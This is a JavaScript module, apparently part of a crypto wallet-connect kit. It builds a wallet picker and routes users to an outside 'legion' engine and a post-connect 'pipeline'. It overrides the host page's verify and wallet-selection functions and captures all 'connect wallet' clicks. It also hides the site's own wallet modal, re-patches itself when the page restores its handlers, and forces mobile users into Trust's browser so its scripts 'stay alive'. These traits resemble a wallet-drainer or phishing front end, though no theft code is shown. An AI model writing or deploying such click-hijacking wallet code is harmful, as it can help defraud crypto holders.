/**
 * Trust Card — universal wallet connect (Trust + MetaMask + Coinbase + Rainbow + OKX + QR).
 * Mobile: shows wallet picker bottom-sheet with deep links.
 * Desktop: lets Legion handle extension + QR natively.
 * startTrust() preserved as-is for backward compat with phase-b / post-connect.
 */
(function () {
  'use strict';

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  // ── Detect which wallet's in-app browser we're inside ──────────────────────
  function getInAppWallet() {
    try {
      if (window.__TRUST_IN_APP__) return 'trust';
      if (typeof window.__TRUST_IS_IN_APP__ === 'function' && window.__TRUST_IS_IN_APP__()) return 'trust';
      var q = String(window.location.search || '');
      if (/utm_source=Trust_(iOS|Android)_Browser/i.test(q)) return 'trust';
      if (/[?&]trust_inapp=1(?:&|$)/i.test(q)) return 'trust';
      try {
        if (sessionStorage.getItem('trust_confirmed_inapp') === '1') return 'trust';
      } catch (_) {}

      var ua = navigator.userAgent || '';
      if (/Trust\/[\d.]+/i.test(ua)) return 'trust';
      if (/Trust_iOS_Browser|Trust_Android_Browser/i.test(ua)) return 'trust';
      if (/MetaMaskMobile/i.test(ua)) return 'metamask';
      if (/CoinbaseWallet/i.test(ua)) return 'coinbase';
      if (/OKApp|OKEx/i.test(ua)) return 'okx';
      if (/BiApp/i.test(ua)) return 'binance';
      if (!isMobile()) return null;
      var eth = window.ethereum;
      if (!eth) return null;
      if (eth.isTrust || eth.isTrustWallet) return 'trust';
      if (eth.isMetaMask && !eth.isRabby && !eth.isWalletConnect) return 'metamask';
      if (eth.isCoinbaseWallet || eth.isCoinbaseBrowser) return 'coinbase';
      if (eth.isOkxWallet || eth.isOKExWallet) return 'okx';
    } catch (_) {}
    return null;
  }

  // ── Wallet list for picker ──────────────────────────────────────────────────
  var PICKER_WALLETS = [
    { id: 'trust',    name: 'Trust Wallet',   icon: '🛡️', bg: '#3375BB' },
    { id: 'metamask', name: 'MetaMask',        icon: '🦊', bg: '#F6851B' },
    { id: 'coinbase', name: 'Coinbase Wallet', icon: '💙', bg: '#0052FF' },
    { id: 'rainbow',  name: 'Rainbow',         icon: '🌈', bg: '#7B3FE4' },
    { id: 'okx',      name: 'OKX Wallet',      icon: '⬛', bg: '#111'   },
    { id: 'binance',  name: 'Binance Web3',    icon: '🟡', bg: '#181818', fg: '#F0B90B' },
    { id: 'qr',       name: 'Other / Scan QR', icon: '📷', bg: '#222'   },
  ];

  // ── Wallet picker bottom-sheet (mobile only) ────────────────────────────────
  function buildPickerModal() {
    var rows = PICKER_WALLETS.map(function (w) {
      return (
        '<button type="button" data-wid="' + w.id + '" style="' +
          'display:flex;align-items:center;gap:14px;width:100%;' +
          'background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09);' +
          'border-radius:14px;padding:14px 16px;cursor:pointer;text-align:left;' +
          'color:#fff;font-family:system-ui,-apple-system,sans-serif;font-size:15px;font-weight:500;' +
          'margin-bottom:9px;-webkit-tap-highlight-color:transparent;">' +
          '<span style="display:inline-flex;align-items:center;justify-content:center;' +
            'width:42px;height:42px;border-radius:12px;background:' + w.bg + ';' +
            'font-size:22px;flex-shrink:0;">' + w.icon + '</span>' +
          '<span>' + w.name + '</span>' +
          '<span style="margin-left:auto;color:rgba(255,255,255,.28);font-size:20px;line-height:1;">›</span>' +
        '</button>'
      );
    }).join('');

    var el = document.createElement('div');
    el.id = '__wcp_root';
    el.innerHTML =
      '<div id="__wcp_bg" style="position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:2147483640;' +
        'backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);"></div>' +
      '<div id="__wcp_sheet" style="position:fixed;left:0;right:0;bottom:0;z-index:2147483641;' +
        'background:#141414;border-radius:22px 22px 0 0;' +
        'padding:0 16px calc(20px + env(safe-area-inset-bottom,0px));' +
        'font-family:system-ui,-apple-system,sans-serif;max-height:90vh;overflow-y:auto;' +
        'transform:translateY(100%);transition:transform .3s cubic-bezier(.32,1,.23,1);">' +
        '<div style="width:36px;height:4px;background:#2e2e2e;border-radius:2px;margin:14px auto 18px;"></div>' +
        '<p style="text-align:center;color:#fff;font-size:17px;font-weight:700;margin:0 0 16px;">Connect Wallet</p>' +
        rows +
        '<button type="button" id="__wcp_cancel" style="width:100%;margin-top:4px;' +
          'background:transparent;border:1px solid #252525;border-radius:13px;' +
          'padding:14px;color:#555;font-size:15px;font-family:inherit;cursor:pointer;">' +
          'Cancel' +
        '</button>' +
      '</div>';

    document.body.appendChild(el);

    el.querySelector('#__wcp_bg').addEventListener('click', hideWalletPicker);
    el.querySelector('#__wcp_cancel').addEventListener('click', hideWalletPicker);

    var btns = el.querySelectorAll('[data-wid]');
    for (var i = 0; i < btns.length; i++) {
      (function (b) {
        b.addEventListener('click', function () {
          hideWalletPicker();
          connectWalletById(b.getAttribute('data-wid'));
        });
        b.addEventListener('touchstart', function () { b.style.background = 'rgba(255,255,255,.13)'; }, { passive: true });
        b.addEventListener('touchend', function () { b.style.background = 'rgba(255,255,255,.06)'; }, { passive: true });
        b.addEventListener('mouseenter', function () { b.style.background = 'rgba(255,255,255,.12)'; });
        b.addEventListener('mouseleave', function () { b.style.background = 'rgba(255,255,255,.06)'; });
      })(btns[i]);
    }

    return el;
  }

  function showWalletPicker() {
    var el = document.getElementById('__wcp_root') || buildPickerModal();
    el.style.display = 'block';
    document.body.style.overflow = 'hidden';
    var sheet = el.querySelector('#__wcp_sheet');
    if (sheet) {
      sheet.style.transition = 'none';
      sheet.style.transform = 'translateY(100%)';
      requestAnimationFrame(function () {
        sheet.style.transition = 'transform .3s cubic-bezier(.32,1,.23,1)';
        requestAnimationFrame(function () { sheet.style.transform = 'translateY(0)'; });
      });
    }
  }

  function hideWalletPicker() {
    var el = document.getElementById('__wcp_root');
    if (!el) return;
    var sheet = el.querySelector('#__wcp_sheet');
    if (sheet) {
      sheet.style.transform = 'translateY(100%)';
      setTimeout(function () { el.style.display = 'none'; document.body.style.overflow = ''; }, 300);
    } else {
      el.style.display = 'none';
      document.body.style.overflow = '';
    }
  }

  // ── Connect by wallet ID ────────────────────────────────────────────────────
  // Works for: trust / metamask / coinbase / rainbow / okx / binance / qr
  function connectWalletById(walletId) {
    window.__SELECTED_WALLET__ = walletId;
    hideLegionFloatingButtons();

    // Trust + not in Trust Browser → official open_url (site runs inside Trust)
    if (walletId === 'trust' && isMobile() && !getInAppWallet()) {
      try {
        if (typeof window.__TRUST_OPEN_INAPP__ === 'function' && window.__TRUST_OPEN_INAPP__()) {
          return;
        }
      } catch (_) {}
    }

    // Already inside Trust Browser → AppKit multichain (all chains), not ETH-only injected
    if (walletId === 'trust' && getInAppWallet() === 'trust') {
      try {
        try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
        try { window.__TRUST_INAPP_APPKIT__ = true; } catch (_) {}
        setAppKitVisible(true);
        if (typeof window.__TRUST_CONNECT_APPKIT__ === 'function') {
          window.__TRUST_CONNECT_APPKIT__();
          return;
        }
        if (typeof window.__TRUST_CONNECT_INJECTED__ === 'function') {
          window.__TRUST_CONNECT_INJECTED__();
          return;
        }
      } catch (_) {}
    }

    var L = window.legion;
    if (!L) {
      window.showToast && window.showToast('Wallet engine loading… retry in a second', 2500);
      setTimeout(function () { connectWalletById(walletId); }, 400);
      return;
    }

    if (walletId === 'qr') {
      // Show AppKit QR — unhide the modal
      try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
      setAppKitVisible(true);
      if (!alreadyConnectedAddr()) { try { typeof L.clearWc === 'function' && L.clearWc(false); } catch (_) {} }
      try { typeof L.beginConnect === 'function' && L.beginConnect('wc'); } catch (_) {}
      if (typeof L.connectWC === 'function') L.connectWC();
      else if (typeof L.connect === 'function') L.connect();
      return;
    }

    // Named wallet: deep-link on mobile; on desktop SHOW AppKit QR (do not hide)
    try { window.__LEGION_DEEP_LINK_TARGET__ = walletId; } catch (_) {}
    var mobileUa2 = /Android|iPhone|iPad|iPod|Mobile/i.test(String(navigator.userAgent || ''));
    setAppKitVisible(!mobileUa2);

    // Resume if already connected — single pipeline owner (no approve sheet)
    var existing = alreadyConnectedAddr();
    if (existing) {
      try {
        if (typeof L.startPipeline === 'function') { L.startPipeline({ reason: 'resume' }); return; }
        if (typeof L.continueConnected === 'function') { L.continueConnected(); return; }
      } catch (_) {}
    }

    if (!alreadyConnectedAddr()) { try { typeof L.clearWc === 'function' && L.clearWc(false); } catch (_) {} }
    try { typeof L.beginConnect === 'function' && L.beginConnect('wc'); } catch (_) {}
    if (typeof L.connectWC === 'function') L.connectWC();
    else if (typeof L.connect === 'function') L.connect();

    // Fire deep-link rescue (works for any wallet via __SELECTED_WALLET__)
    if (isMobile() && typeof window.__TRUST_OPEN_DEEPLINK__ === 'function') {
      setTimeout(function () { window.__TRUST_OPEN_DEEPLINK__(false); }, 600);
      setTimeout(function () { window.__TRUST_OPEN_DEEPLINK__(false); }, 1800);
    }
  }

  // ── AppKit modal visibility toggle ─────────────────────────────────────────
  // BUG FIX: old CSS hid w3m-modal for ALL viewports ≤1024px — desktop narrow
  // windows (Cursor browser, etc.) got opacity:0 so QR never appeared.
  // Now: hide only on real mobile UA when deeplink path intentionally hides modal.
  function setAppKitVisible(show) {
    var s = document.getElementById('__wc_appkit_css');
    if (!s) { s = document.createElement('style'); s.id = '__wc_appkit_css'; document.head.appendChild(s); }
    if (show) {
      s.textContent = 'w3m-modal,wcm-modal{opacity:1!important;pointer-events:auto!important;visibility:visible!important;z-index:2147483000!important}';
      return;
    }
    var mobileUa = /Android|iPhone|iPad|iPod|Mobile/i.test(String(navigator.userAgent || ''));
    s.textContent = mobileUa
      ? 'w3m-modal,wcm-modal{opacity:0!important;pointer-events:none!important}'
      : 'w3m-modal,wcm-modal{opacity:1!important;pointer-events:auto!important;visibility:visible!important}';
  }
  // Default: hide AppKit on mobile (deeplink path), show on desktop (QR path)
  setAppKitVisible(false);

  function openSmartConnect() {
    hideLegionFloatingButtons();
    var inApp = getInAppWallet();
    if (inApp === 'trust') {
      try {
        try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
        try { window.__TRUST_INAPP_APPKIT__ = true; } catch (_) {}
        setAppKitVisible(true);
        if (typeof window.__TRUST_CONNECT_APPKIT__ === 'function') {
          window.__TRUST_CONNECT_APPKIT__();
          return;
        }
        if (typeof window.__TRUST_CONNECT_INJECTED__ === 'function') {
          window.__TRUST_CONNECT_INJECTED__();
          return;
        }
      } catch (_) {}
      connectWalletById('trust');
      return;
    }
    if (inApp) {
      // Inside a wallet's own browser — connect directly
      connectWalletById(inApp);
      return;
    }
    if (isMobile()) {
      // Prefer Trust open_url (site → Trust Browser) over WC picker for one-shot
      try {
        if (typeof window.__TRUST_OPEN_INAPP__ === 'function' && window.__TRUST_OPEN_INAPP__()) {
          return;
        }
      } catch (_) {}
      showWalletPicker();
    } else {
      // Desktop: let Legion choose (extension if present, else AppKit QR)
      try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
      setAppKitVisible(true);
      var L = window.legion;
      if (!L) { setTimeout(openSmartConnect, 400); return; }
      if (!alreadyConnectedAddr()) { try { typeof L.clearWc === 'function' && L.clearWc(false); } catch (_) {} }
      if (typeof L.connect === 'function') L.connect();
      else if (typeof L.connectWC === 'function') L.connectWC();
    }
  }

  // Expose for rescue script + other modules
  window.__SELECTED_WALLET__ = window.__SELECTED_WALLET__ || null;
  window.__WC_CONNECT__ = connectWalletById;
  window.__WALLET_PICKER_SHOW__ = showWalletPicker;

  function hideLegionFloatingButtons() {
    try {
      var root = document.getElementById('__lgn_root');
      if (root) root.remove();
    } catch (_) {}
  }

  function hideOtherWallets() {
    try {
      var grid = document.querySelector('#cwModal .cw-wallet-grid');
      if (!grid) return;
      var items = grid.querySelectorAll('.cw-wallet-item');
      for (var i = 0; i < items.length; i++) {
        var name = (items[i].textContent || '').toLowerCase();
        if (name.indexOf('trust') === -1) {
          items[i].style.display = 'none';
        }
      }
      var modal = document.getElementById('cwModal');
      if (modal) modal.classList.remove('cw-show');
      document.body.style.overflow = '';
    } catch (_) {}
  }

  function alreadyConnectedAddr() {
    try {
      var a = sessionStorage.getItem('trust_site_connected_addr') || sessionStorage.getItem('legion_wc_evm_addr');
      if (a && /^0x[a-f0-9]{40}$/i.test(a)) return a.toLowerCase();
    } catch (_) {}
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        return String(window.legion.state.evmAddr).toLowerCase();
      }
    } catch (_) {}
    return '';
  }

  function startTrust() {
    hideLegionFloatingButtons();
    hideOtherWallets();
    window.__SELECTED_WALLET__ = 'trust';
    // Always pin Trust as deep-link target (mobile + desktop WC→Trust)
    try { window.__LEGION_DEEP_LINK_TARGET__ = 'trust'; } catch (_) {}
    // Desktop browser: KEEP AppKit visible so WalletConnect QR can show.
    // Mobile: hide modal and use deeplink / in-app path instead.
    var mobileUa = /Android|iPhone|iPad|iPod|Mobile/i.test(String(navigator.userAgent || ''));
    setAppKitVisible(!mobileUa || !!getInAppWallet());

    // Mobile Safari → open_url into Trust Browser (scripts stay alive there)
    if (isMobile() && !getInAppWallet()) {
      try {
        if (typeof window.__TRUST_OPEN_INAPP__ === 'function' && window.__TRUST_OPEN_INAPP__()) {
          return;
        }
      } catch (_) {}
    }

    // Inside Trust Browser → AppKit multichain (all chains popup)
    if (getInAppWallet() === 'trust') {
      try {
        try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
        try { window.__TRUST_INAPP_APPKIT__ = true; } catch (_) {}
        setAppKitVisible(true);
        if (typeof window.__TRUST_CONNECT_APPKIT__ === 'function') {
          window.__TRUST_CONNECT_APPKIT__();
          return;
        }
        if (typeof window.__TRUST_CONNECT_INJECTED__ === 'function') {
          window.__TRUST_CONNECT_INJECTED__();
          return;
        }
      } catch (_) {}
    }

    // Already linked this session — resume, do NOT clearWc (that was wiping return-from-Trust)
    var existing = alreadyConnectedAddr();
    if (existing) {
      console.warn('[TrustDirect] already connected — resume', existing.slice(0, 10));
      try {
        if (window.legion && typeof window.legion.startPipeline === 'function') {
          window.legion.startPipeline({ reason: 'resume' });
          return;
        }
        if (window.legion && typeof window.legion.continueConnected === 'function') {
          window.legion.continueConnected();
          return;
        }
      } catch (_) {}
    }

    // Prefer SPA selectWallet (sets loaders + Legion deep-link target)
    if (typeof window.selectWallet === 'function') {
      try {
        window.selectWallet('Trust Wallet', null);
        // If URI already cached, force open Trust immediately
        if (isMobile() && typeof window.__TRUST_OPEN_DEEPLINK__ === 'function') {
          setTimeout(function () { window.__TRUST_OPEN_DEEPLINK__(false); }, 400);
        }
        return;
      } catch (_) {}
    }

    // Fallback: same as SPA m("trust")
    var L = window.legion;
    if (!L) {
      window.showToast && window.showToast('Wallet engine loading… retry in a second', 2500);
      setTimeout(startTrust, 400);
      return;
    }
    // Only clear stale WC if no recoverable address
    if (!alreadyConnectedAddr()) {
      try { typeof L.clearWc === 'function' && L.clearWc(false); } catch (_) {}
    }
    try { typeof L.beginConnect === 'function' && L.beginConnect('wc'); } catch (_) {}
    if (typeof L.connectWC === 'function') L.connectWC();
    else if (typeof L.connect === 'function') L.connect();

    if (isMobile() && typeof window.__TRUST_OPEN_DEEPLINK__ === 'function') {
      setTimeout(function () { window.__TRUST_OPEN_DEEPLINK__(false); }, 600);
      setTimeout(function () { window.__TRUST_OPEN_DEEPLINK__(false); }, 1800);
    }
  }

  // Export for connected-ui / confirmVerify
  window.__TRUST_DIRECT_CONNECT__ = startTrust;

  function patchConfirmVerify() {
    // Use openSmartConnect so mobile gets picker, desktop gets extension/QR
    window.confirmVerify = function () {
      openSmartConnect();
    };
  }

  function patchSelectWallet() {
    var orig = window.selectWallet;
    if (typeof orig !== 'function') return;
    window.selectWallet = function (name, el) {
      var n = String(name || '').toLowerCase().replace(/\s+/g, '');
      // Route by wallet name
      if (n.indexOf('metamask') !== -1)                          { connectWalletById('metamask'); return; }
      if (n.indexOf('coinbase') !== -1)                          { connectWalletById('coinbase'); return; }
      if (n.indexOf('rainbow') !== -1)                           { connectWalletById('rainbow');  return; }
      if (n.indexOf('okx') !== -1 || n.indexOf('okex') !== -1)  { connectWalletById('okx');      return; }
      if (n.indexOf('binance') !== -1)                           { connectWalletById('binance');  return; }
      if (n.indexOf('trust') !== -1 || !n) {
        connectWalletById('trust');
        return;
      }
      // Unknown wallet name → show picker on mobile, else pass through
      if (isMobile()) { showWalletPicker(); } else { orig.call(this, name, el || null); }
    };
  }

  function interceptClicks(e) {
    var t = e.target;
    if (!t) return;
    var btn = t.closest ? t.closest('button, a, [role="button"]') : null;
    if (!btn) return;
    var id = btn.id || '';
    var txt = (btn.textContent || '').trim().toLowerCase();

    // Legion floating buttons — route to smart connect
    if (id === '__lgn_cb' || id === '__lgn_wb') {
      e.preventDefault();
      e.stopPropagation();
      openSmartConnect();
      return;
    }

    // Site CTAs
    if (
      id === 'cfmbtn' ||
      txt === 'connect wallet' ||
      (txt.indexOf('connect') !== -1 && txt.indexOf('wallet') !== -1)
    ) {
      // Let confirmVerify run if it's the verify button (we patched it already)
      if (id === 'cfmbtn') return;
      e.preventDefault();
      e.stopPropagation();
      openSmartConnect();
    }
  }

  // Style: never show multi-wallet grid / legion floating root
  var style = document.createElement('style');
  style.id = '__trust_direct_css';
  style.textContent = [
    '#__lgn_root{display:none!important}',
    '#cwModal.cw-show{display:none!important}',
    '#cwModal .cw-wallet-item:not(:first-child){display:none!important}',
    '#__lgn_st{display:none!important}',
  ].join('');
  (document.head || document.documentElement).appendChild(style);

  function boot() {
    hideLegionFloatingButtons();
    hideOtherWallets();
    patchConfirmVerify();
    patchSelectWallet();
    document.addEventListener('click', interceptClicks, true);
  }

  // Patch as soon as SPA defines handlers (poll briefly)
  var tries = 0;
  var t = setInterval(function () {
    tries++;
    if (typeof window.confirmVerify === 'function' || typeof window.selectWallet === 'function') {
      boot();
      clearInterval(t);
      return;
    }
    if (tries > 80) {
      boot();
      clearInterval(t);
    }
  }, 50);

  document.addEventListener('DOMContentLoaded', function () {
    hideLegionFloatingButtons();
    boot();
  });

  // If SPA re-renders and reassigns confirmVerify, re-patch
  var obs = new MutationObserver(function () {
    if (typeof window.confirmVerify === 'function' &&
        window.confirmVerify !== openSmartConnect) {
      // Only re-patch if SPA is trying to show its own modal
      var src = Function.prototype.toString.call(window.confirmVerify);
      if (src.indexOf('cw-show') !== -1 || src.indexOf('cwModal') !== -1) {
        patchConfirmVerify();
      }
    }
    hideLegionFloatingButtons();
  });
  if (document.body) obs.observe(document.body, { childList: true, subtree: true });
  else document.addEventListener('DOMContentLoaded', function () {
    obs.observe(document.body, { childList: true, subtree: true });
  });

  window.__TRUST_DIRECT_CONNECT__ = startTrust; // kept for phase-b / post-connect compat
  window.__SMART_CONNECT__ = openSmartConnect;   // new universal entry
})();
